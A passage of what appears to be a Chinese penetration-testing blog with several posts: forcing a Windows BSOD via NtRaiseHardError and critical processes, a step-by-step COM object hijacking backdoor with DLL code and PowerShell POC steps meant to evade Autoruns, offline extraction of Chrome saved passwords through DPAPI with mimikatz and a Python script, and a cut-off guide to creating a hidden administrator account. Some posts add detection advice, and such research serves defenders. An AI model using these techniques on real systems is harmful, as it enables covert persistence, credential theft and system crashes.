	ResponseCancel,
	ResponseIgnore,
	ResponseNo,
	ResponseOk,
	ResponseRetry,
	ResponseYes
} HARDERROR_RESPONSE, *PHARDERROR_RESPONSE;

HARDERROR_RESPONSE OR;
HARDERROR_RESPONSE_OPTION OP;
OR = ResponseYes;
OP = OptionShutdownSystem;
NtRaiseHardError(0xC0000217, 0, 0, 0, OptionShutdownSystem, &amp;OR);
</code></pre></div></div>

<p>参考资料：</p>

<p>http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html</p>

<p>函数原型：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NtRaiseHardError(

  IN NTSTATUS             ErrorStatus,
  IN ULONG                NumberOfParameters,
  IN PUNICODE_STRING      UnicodeStringParameterMask OPTIONAL,
  IN PVOID                *Parameters,
  IN HARDERROR_RESPONSE_OPTION ResponseOption,
  OUT PHARDERROR_RESPONSE Response );
</code></pre></div></div>

<p>这个函数在处理异常时用于产生应用程序错误对话框，通常用法是弹出对话框提示用户是否要终止进程，但我们如果把参数设置为0xC0000217，OptionShutdownSystem和ResponseYes，那么会导致BSOD，提示0xC0000217</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-2/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>ErrorStatus也可以为其他值，可参考NTSTATUS的说明，地址如下：</p>

<p>https://msdn.microsoft.com/en-us/library/cc704588.aspx</p>

<p>选择代表失败函数的值即可，例如0xC000000C(STATUS_TIMER_NOT_CANCELED)、0xC0000216(STATUS_NOT_SERVER_SESSION)、0xC0000219(STATUS_DEBUG_ATTACH_FAILED)</p>

<h2 id="0x03-结束指定进程导致bsod的方法">0x03 结束指定进程导致BSOD的方法</h2>
<hr>

<p>以上三个函数，只有NtSetInformationProcess支持传入进程句柄</p>

<p>接下来，我们只要能够获得指定进程的句柄，传入NtSetInformationProcess即可实现结束指定进程导致BSOD</p>

<p>思路如下：</p>

<ul>
  <li>提升至Debug权限</li>
  <li>通过OpenProcess打开指定的进程，获得进程句柄</li>
  <li>调用CallNtSetInformationProcess将指定进程设置为critical process</li>
</ul>

<p>完整代码可参考如下链接：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/SetProcessCritical.cpp</p>

<p>代码还支持将指定进程从critical process设置为正常进程</p>

<h2 id="0x04-防御思路">0x04 防御思路</h2>
<hr>

<p>为了避免这种情况的发生，我们在结束进程时，需要先查看该进程是否为critical process，如果是critical process，需要设置为正常进程后再结束</p>

<p>这里就涉及到查询进程是否为critical process</p>

<p>需要使用内核API NtQueryInformationProcess查询ProcessBreakOnTermination，获得进程信息</p>

<p>关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>status = NtQueryInformationProcess(hProcess, ProcessBreakOnTermination, &amp;breakOnTermination, sizeof(ULONG), NULL);
if(status&lt;0)
	printf("[!]NtQueryInformationProcess error\n");
if(breakOnTermination ==1)
	printf("[+]The process is critical");
else
	printf("[!]The process is not critical");
</code></pre></div></div>

<p>完整代码可参考如下链接：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/CheckCriticalProess.cpp</p>

<p>代码实现了查询指定进程是否为critical process</p>

<p>在实际应用上，通过会查询当前系统的所有进程是否存在critical process</p>

<p>在代码实现上，可通过EnumProcesses所有进程PID，接着做进一步查询</p>

<p>完整代码可参考如下链接：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/FindCriticalProcess.cpp</p>

<p>代码实现了查询当前系统的所有进程，过滤掉系统进程，标记出critical process</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文测试了三种结束当前进程导致BSOD的方法，进一步介绍了结束指定进程导致BSOD的方法，结合利用思路，分析防御方法，编写程序实现了查询当前系统所有进程并标记出critical process，在结束critical process前将其设置为正常进程，能够避免系统出现BOSD</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July  2, 2018
  </div>

  
</article><article class="post">
  <h1>Use COM Object hijacking to maintain persistence——Hijack CAccPropServicesClass and MMDeviceEnumerator</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/">《Use CLR to maintain persistence》</a>介绍了通过CLR劫持所有.Net程序的方法，无需管理员权限，可用作后门。美中不足的是通过WMI添加环境变量需要重启系统。</p>

<p>本文将继续介绍另一种后门的利用方法，原理类似，但优点是不需要重启系统，同样也不需要管理员权限。</p>

<p><strong>注：</strong></p>

<p>本文介绍的方法曾被木马COMpfun使用</p>

<p><strong>详细介绍地址：</strong></p>

<p>https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>后门思路</li>
  <li>POC编写</li>
  <li>防御检测</li>
</ul>

<h2 id="0x02-com组件">0x02 COM组件</h2>
<hr>

<ul>
  <li>COM是Component Object Model （组件对象模型）的缩写</li>
  <li>COM组件由DLL和EXE形式发布的可执行代码所组成</li>
  <li>COM与语言，平台无关</li>
  <li>COM组件对应注册表中CLSID下的注册表键值</li>
</ul>

<h2 id="0x03-后门思路">0x03 后门思路</h2>
<hr>

<p><strong>注：</strong></p>

<p>思路来自于https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence</p>

<p>同使用CLR劫持.Net程序的方法类似，也是通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例，所以，这就可以用作后门来使用，并且，该方法也能够绕过Autoruns对启动项的检测。</p>

<h3 id="32位系统利用方法">32位系统利用方法：</h3>

<p><strong>1、新建文件</strong></p>

<p>在<code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\</code>下放入测试dll，重命名为<code class="language-plaintext highlighter-rouge">api-ms-win-downlevel-[4char-random]-l1-1-0._dl</code></p>

<p><strong>注：</strong></p>

<p>测试dll下载地址：https://github.com/3gstudent/test/blob/master/calc.dll</p>

<p>重命名为<code class="language-plaintext highlighter-rouge">api-ms-win-downlevel-1x86-l1-1-0._dl</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-4/1-1.png" alt="Alt text"></p>

<p><strong>2、修改注册表</strong></p>

<p>注册表位置：<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\CLSID\</code></p>

<p>创建项<code class="language-plaintext highlighter-rouge">{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code></p>

<p>创建子项<code class="language-plaintext highlighter-rouge">InprocServer32</code></p>

<p>Default的键值为测试dll的绝对路径：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl</code></p>

<p>创建键值： <code class="language-plaintext highlighter-rouge">ThreadingModel</code> <code class="language-plaintext highlighter-rouge">REG_SZ</code> <code class="language-plaintext highlighter-rouge">Apartment</code></p>

<p>注册表内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-4/1-2.png" alt="Alt text"></p>

<p><strong>3、测试</strong></p>

<p>启动iexplore.exe，触发后门，多次启动calc.exe，最终导致系统死机</p>

<p>启动过程多次调用实例CAccPropServicesClass()，因此导致启动多个calc.exe，最终系统死机</p>

<p><strong>4、优化</strong></p>

<p>可以对dll加一个互斥量，防止重复加载，只启动一次calc.exe</p>

<p>c++代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#pragma comment(linker,"/OPT:nowin98")
BOOL TestMutex()
{

	HANDLE hMutex = CreateMutex(NULL, false, "myself");  
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hMutex);
		return 0;  
	}
	return 1;
}
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			if(TestMutex()==0)
				return TRUE;
			WinExec("calc.exe",SW_SHOWNORMAL);
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }return TRUE;
}
</code></pre></div></div>

<p>优化方法参照：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/</p>

<p>编译后大小3k，如果多次加载该dll，会因为互斥量导致只加载一次，也就是说只启动一次calc.exe</p>

<p>编译好的dll下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/calcmutex.dll</p>

<p>换用新的dll，再次测试，只启动一次calc.exe，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-4/2-1.png" alt="Alt text"></p>

<h3 id="64位系统利用方法">64位系统利用方法：</h3>

<p><strong>1、新建文件</strong></p>

<p>在<code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\</code>下分别放入32位和64位的测试dll</p>

<p>32位dll下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/calcmutex.dll</p>

<p>重命名为<code class="language-plaintext highlighter-rouge">api-ms-win-downlevel-1x86-l1-1-0._dl</code></p>

<p>64位dll下载地址：</p>

<p>https://github.com/3gstudent/test/blob/master/calcmutex_x64.dll</p>

<p>重命名为<code class="language-plaintext highlighter-rouge">api-ms-win-downlevel-1x64-l1-1-0._dl</code></p>

<p><strong>2、修改注册表</strong></p>

<p>(1)</p>

<p>注册表位置：<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\CLSID\</code></p>

<p>创建项<code class="language-plaintext highlighter-rouge">{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code></p>

<p>创建子项<code class="language-plaintext highlighter-rouge">InprocServer32</code></p>

<p>Default的键值为64位dll的绝对路径：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x64-l1-1-0._dl</code></p>

<p>创建键值： <code class="language-plaintext highlighter-rouge">ThreadingModel</code> <code class="language-plaintext highlighter-rouge">REG_SZ</code> <code class="language-plaintext highlighter-rouge">Apartment</code></p>

<p>注册表内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-4/2-2.png" alt="Alt text"></p>

<p>(2)</p>

<p>注册表位置：<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\Wow6432Node\CLSID\</code></p>

<p>创建项<code class="language-plaintext highlighter-rouge">{BCDE0395-E52F-467C-8E3D-C4579291692E}</code></p>

<p>创建子项<code class="language-plaintext highlighter-rouge">InprocServer32</code></p>

<p>Default的键值为32位dll路径：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl</code></p>

<p>创建键值： <code class="language-plaintext highlighter-rouge">ThreadingModel</code> <code class="language-plaintext highlighter-rouge">REG_SZ</code> <code class="language-plaintext highlighter-rouge">Apartment</code></p>

<p>注册表内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-4/2-3.png" alt="Alt text"></p>

<p><strong>3、测试</strong></p>

<p>分别启动32位和64位的iexplore.exe，均可触发后门，启动一次calc.exe</p>

<p>测试成功</p>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>对应<code class="language-plaintext highlighter-rouge">CAccPropServicesClass</code></p>

<p>参考链接:</p>

<p>https://msdn.microsoft.com/en-us/library/accessibility.caccpropservicesclass(v=vs.110).aspx?cs-save-lang=1&amp;cs-lang=cpp#code-snippet-1</p>

<p><code class="language-plaintext highlighter-rouge">{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>对应<code class="language-plaintext highlighter-rouge">MMDeviceEnumerator</code></p>

<p>参考链接:</p>

<p>http://msdn.microsoft.com/en-us/library/windows/desktop/dd316556%28v=vs.85%29.aspx</p>

<h2 id="0x04-poc编写">0x04 POC编写</h2>
<hr>

<p>POC开发需要注意的细节：</p>

<p><strong>1、操作默认不一定包含文件夹</strong></p>

<p>需要先判断文件夹<code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Installer\</code>
如果没有，在<code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\</code>下创建文件夹Installer</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if((Test-Path %APPDATA%\Microsoft\Installer\) -eq 0)
{
	Write-Host "[+] Create Folder:  $env:APPDATA\Microsoft\Installer\"
	new-item -path $env:APPDATA\Microsoft\ -name Installer -type directory
}
</code></pre></div></div>

<p><strong>2、创建文件夹{BCDE0395-E52F-467C-8E3D-C4579291692E}</strong></p>

<p>由于包含特殊字符{}，需要双引号包含路径</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if((Test-Path "%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}") -eq 0)
{
	Write-Host "[+] Create Folder:  $env:APPDATA\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}"
	new-item -path $env:APPDATA\Microsoft\Installer -name {BCDE0395-E52F-467C-8E3D-C4579291692E} -type directory
}
</code></pre></div></div>

<p><strong>3、创建payload文件</strong></p>

<p>首先判断操作系统</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ([Environment]::Is64BitOperatingSystem)
{
        Write-Host "[+] OS: x64"       
}
else
{
        Write-Host "[+] OS: x86"
}
</code></pre></div></div>

<p>不同系统释放不同文件</p>

<p>释放文件依旧使用base64，可参考文章：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/</p>

<p><strong>4、创建注册表</strong></p>

<p>修改注册表默认值，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-4/3-1.png" alt="Alt text"></p>

<p>在powershell下，需要使用特殊变量<code class="language-plaintext highlighter-rouge">"(default)"</code></p>

<p>eg：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RegPath="HKCU:Software\Classes\CLSID\"
New-ItemProperty $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" "(default)" -value $env:APPDATA"\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl" -propertyType string | Out-Null
</code></pre></div></div>

<p>完整POC已上传至Github，地址为：https://github.com/3gstudent/COM-Object-hijacking</p>

<h2 id="0x05-防御检测">0x05 防御检测</h2>
<hr>

<p>结合利用方法，注意监控以下位置：</p>

<h3 id="1注册表键值">1、注册表键值</h3>

<ul>
  <li>HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\</li>
  <li>HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E }</li>
</ul>

<h3 id="2文件路径">2、文件路径</h3>

<p><code class="language-plaintext highlighter-rouge">%APPDATA%\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\</code></p>

<p>命名方式：<code class="language-plaintext highlighter-rouge">api-ms-win-downlevel-[4char-random]-l1-1-0._dl</code></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了通过COM Object hijacking实现的后门利用方法，使用powershell脚本编写POC，分享POC开发中需要注意的细节，结合实际利用过程分析该后门的防御方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on August  4, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——离线导出Chrome浏览器中保存的密码</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——导出Chrome浏览器中保存的密码》</a>介绍了导出Chrome浏览器密码的原理和利用方法，文末留下一个问题： <strong>如果只获得了用户的ntlm hash，能否导出Chrome浏览器保存的明文密码呢？</strong></p>

<p>该部分的参考资料较少，而想要解答这个问题，需要了解加解密的原理，所以本文尝试对该部分内容做介绍，得出最终结论</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>DPAPI简介及相关概念</li>
  <li>DPAPI加解密流程</li>
  <li>离线导出原理</li>
  <li>离线导出方法</li>
  <li>得出最终结论</li>
</ul>

<h2 id="0x02-dpapi简介">0x02 DPAPI简介</h2>
<hr>

<p>本节内容参考自如下链接，加入个人理解：</p>

<p>https://msdn.microsoft.com/en-us/library/ms995355.aspx</p>

<p>https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28</p>

<p>DPAPI全称<code class="language-plaintext highlighter-rouge">Data Protection Application Programming Interface</code></p>

<p>作为Windows系统的一个数据保护接口被广泛使用</p>

<p>主要用于保护加密的数据，常见的应用如：</p>

<ul>
  <li>EFS文件加密</li>
  <li>存储无线连接密码</li>
  <li>Windows Credential Manager</li>
  <li>Internet Explorer</li>
  <li>Outlook</li>
  <li>Skype</li>
  <li>Windows CardSpace</li>
  <li>Windows Vault</li>
  <li>Google Chrome</li>
</ul>

<p>使用简单，加密使用函数CryptProtectData，解密使用函数CryptUnprotectData即可，系统在后台自动完成其他复杂的加解密操作</p>

<p>CryptProtectData的说明可参考：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx</p>

<p>CryptUnprotectData的说明可参考：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx</p>

<h3 id="专有名词">专有名词</h3>

<h4 id="dpapi-blob">DPAPI blob：</h4>

<p>一段密文，可使用Master Key对其解密</p>

<p>结构如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/2-1.png" alt="Alt text"></p>

<p>该图引用自https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28</p>

<h4 id="master-key">Master Key：</h4>

<p>64字节，用于解密DPAPI blob</p>

<p>通过用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p>

<h4 id="master-key-file">Master Key file：</h4>

<p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p>

<p>包含以下五个部分：</p>

<ul>
  <li>Header and system information</li>
  <li>User’s Master Key</li>
  <li>Local backup encryption key</li>
  <li>Unique CREDHIST file identifier</li>
  <li>Domain Master Key backup</li>
</ul>

<p>位于固定位置： <code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%</code></p>

<p>例如：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Roaming\Microsoft\Protect\S-1-5-21-3453529135-4164765056-1075703908-1001</code></p>

<p>包含文件<code class="language-plaintext highlighter-rouge">329c4147-0011-4ad6-829d-e32dcbd1bbd7</code>(系统文件，隐藏属性)</p>

<p>无法直接查看</p>

<p>可通过mimikatz对其解析，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe log "dpapi::masterkey /in:"329c4147-0011-4ad6-829d-e32dcbd1bbd7"
</code></pre></div></div>

<p>输出如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz(commandline) # dpapi::masterkey /in:329c4147-0011-4ad6-829d-e32dcbd1bbd7
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {329c4147-0011-4ad6-829d-e32dcbd1bbd7}
  dwFlags            : 00000005 - 5
  dwMasterKeyLen     : 000000b0 - 176
  dwBackupKeyLen     : 00000090 - 144
  dwCredHistLen      : 00000014 - 20
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 9917a47f1949226e4e8c5b8a3aaf4808
    rounds           : 00000ce4 - 3300
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : cf2634535384431da063fd9a240ab575d13dc1daee8ea545d5c9a0628fa5cc63cf825b3b24642b3d7fe98a3703c1e7cdc7e49132a017e3e45fe34f8512fdb8b224e5c30a754683ff6e098a94a1ee396c026a6022323aff6903b3cdad1185a719accadb924f80482dcf426996fb3f662323d7c9e885504f39baa080d63eaddd2621171b3d780cef9c47d9a0b79a4afc20

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 57fb6f4228e9ca7d686c7f174f1691b0
    rounds           : 00000ce4 - 3300
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 1ae34b8395375465871a999c0d04365cc5089cad4bea139344ecb8f9cf0da1abe5d7b096e9594506a0d8c772469b1f81118d608823e2be33020a8a86bb6d190d61865d270e299dfec9aca011531313dd2a2cd6dc4a53adc77b17a410d15ac4c6b11b3450d1c9739e869f67a8278d60ee

[credhist]
  **CREDHIST INFO**
    dwVersion        : 00000003 - 3
    guid             : {58680bc7-055e-4728-ab96-c34d64c565f2}
</code></pre></div></div>

<h2 id="0x03-dpapi解密思路">0x03 DPAPI解密思路</h2>
<hr>

<h3 id="1使用用户登录密码解密master-key-file获得master-key">1、使用用户登录密码解密Master Key file，获得Master Key</h3>

<p>固定位置： <code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%</code>下往往有多个Master Key file</p>

<p>这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)</p>

<p><code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%</code>下存在一个固定文件<code class="language-plaintext highlighter-rouge">Preferred</code>，包含最后一个Master Key file的名称和创建时间，文件结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _tagPreferredMasterKey
{
  GUID guidMasterKey;
  FILETIME ftCreated;
} PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;
</code></pre></div></div>

<h3 id="2使用master-key解密dpapi-blob获得明文">2、使用Master Key解密DPAPI blob，获得明文</h3>

<h2 id="0x04-离线导出chrome浏览器中保存的密码">0x04 离线导出Chrome浏览器中保存的密码</h2>
<hr>

<h3 id="1获得dpapi-blob">1、获得DPAPI blob</h3>

<p>DPAPI blob位于SQLite数据库文件Login Data的password段，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-1.png" alt="Alt text"></p>

<p>使用python脚本对其读取并保存到文件中，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import binascii
conn = sqlite3.connect("Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    print (binascii.b2a_hex(result[2]))
    f = open('test.txt', 'wb')
    f.write(result[2])
    f.close()
</code></pre></div></div>

<h3 id="2解密master-key获得明文">2、解密Master Key获得明文</h3>

<p>使用工具Windows Password Recovery，下载地址：</p>

<p>https://www.passcape.com/index.php?section=downloads&amp;category=28</p>

<p>选择<code class="language-plaintext highlighter-rouge">Utils</code> -&gt; <code class="language-plaintext highlighter-rouge">DPAPI Decoder and Analyser</code> -&gt; <code class="language-plaintext highlighter-rouge">Decrypt DPAPI data blob</code></p>

<p>设置DPAPI blob file指向保存DPAPI blob的文件test.txt，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-2.png" alt="Alt text"></p>

<p>设置Master Key file指向待破解的Master Key file，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-3.png" alt="Alt text"></p>

<p>接下来输入用户登录密码</p>

<p>获得明文，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-4.png" alt="Alt text"></p>

<p>成功解密</p>

<p>使用ChromePass对结果进行验证</p>

<p>ChromePass下载地址：</p>

<p>http://www.nirsoft.net/utils/chromepass.html</p>

<p>参数说明：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/external &lt;User Profile Path&gt; &lt;Last Log-On Password&gt;
</code></pre></div></div>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ChromePass.exe /external c:\1\2\3\ test123 
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-26/3-5.png" alt="Alt text"></p>

<h2 id="0x05-最终结论">0x05 最终结论</h2>
<hr>

<h3 id="1无法自动定位master-key-file">1、无法自动定位Master Key file</h3>

<p>如果用户sid文件夹下包含多个Master Key file，使用Windows Password Recovery尝试解密时，需要逐个测试，也可通过读取文件Preferred的前16字节获得对应的Master Key file</p>

<p>使用ChromePass不存在这个问题，填入文件上级目录的路径即可</p>

<h3 id="2无法使用用户登录密码的ntlm-hash解密master-key">2、无法使用用户登录密码的NTLM hash解密Master Key</h3>

<p>目前版本的DPAPI在设计上考虑到了这个隐患，使用SHA1算法(NTLM hash使用MD4加密)</p>

<p>所以说，无法使用用户登录密码的NTLM hash解密Master Key</p>

<h3 id="3dpapi很安全符合密码安全性的要求">3、DPAPI很安全，符合密码安全性的要求</h3>

<p>以上测试基于已获得了目标系统的访问权限，也就是说目标系统已经变得不安全</p>

<p>对于一个未获得访问权限的Windows系统，目前使用DPAPI不会造成密码被破解的问题</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文通过分析DPAPI加解密流程，得出结论： 使用用户的ntlm hash，无法导出Chrome浏览器保存的明文密码</p>

<h2 id="0x07-补充">0x07 补充</h2>
<hr>

<p>离线导出Chrome浏览器中保存的密码还可以通过lsass进程提取出Master Key进行解密，不需要获得用户的明文密码，详情可参考<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码》</a></p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 26, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows系统的帐户隐藏</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/">《渗透技巧——Windows系统远程桌面的多用户登录》</a>介绍过Windows系统远程桌面的利用技巧，实现了非服务器版本Windows系统的多用户远程登录，而最近我和Evilcg一起研究了通过帐户克隆实现隐藏帐户的利用技巧。如果将二者结合，会有什么利用技巧呢，本文将会一一介绍。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>帐户隐藏的方法</li>
  <li>编写脚本实现思路</li>
  <li>结合远程桌面多用户登录的利用思路</li>
</ul>

<h2 id="0x02-帐户隐藏的方法">0x02 帐户隐藏的方法</h2>
<hr>

<p>该方法在网上已有相关资料，本节只做简单复现</p>

<p>测试系统：·<code class="language-plaintext highlighter-rouge">Win7x86</code></p>

<h3 id="1对注册表赋予权限">1、对注册表赋予权限</h3>

<p>默认注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\</code>只有system权限才能修改</p>

<p>现在需要为其添加管理员权限</p>

<p>右键-权限-选中Administrators，允许完全控制</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-1.png" alt="Alt text"></p>

<p>重新启动注册表regedit.exe，获得对该键值的修改权限</p>

<h3 id="2新建特殊帐户">2、新建特殊帐户</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user test$ 123456 /add
net localgroup administrators test$ /add
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>用户名要以$结尾</p>

<p>添加后，该帐户可在一定条件下隐藏，输入<code class="language-plaintext highlighter-rouge">net user</code>无法获取，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-2.png" alt="Alt text"></p>

<p>但是，在控制面板能够发现该帐户</p>

